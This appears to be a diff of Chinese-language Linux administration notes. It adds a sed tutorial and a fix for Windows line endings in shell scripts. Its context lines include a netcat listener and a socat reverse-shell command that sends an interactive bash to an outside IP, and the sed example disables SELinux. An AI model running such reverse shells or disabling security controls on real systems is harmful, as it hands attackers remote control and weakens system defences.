@@ -1286,11 +1286,26 @@ nc -lvvp 123
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:175.24.115.4:123
 
 
+
+sed命令使用：
+
+格式：
+sed -i 's/原字符串/新字符串/g' file
+
+例子：
+sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config
+
+解释：
+s:表示替换模式
+g:表示全局替换
+-i:表示直接对文本文件进行操作的
+
+
 结束！
 
 
-
-在Linux中执行.sh脚本，/bin/sh^M: bad interpreter:解决办法
+常见问题：
+1、在Linux中执行.sh脚本，报错：/bin/sh^M: bad interpreter:解决办法
 #在win下编辑的时候，换行结尾是\n\r ， 而在linux下 是\n，所以才会有 多出来的\r
 #可以用以下方式解决先在控制台cd到报错的目录
  
@@ -1307,6 +1322,4 @@ vi xxx.sh
 :set ff=unix 或 :set fileformat=unix
  
 #保存退出后再次执行sh文件即可
-
-
 
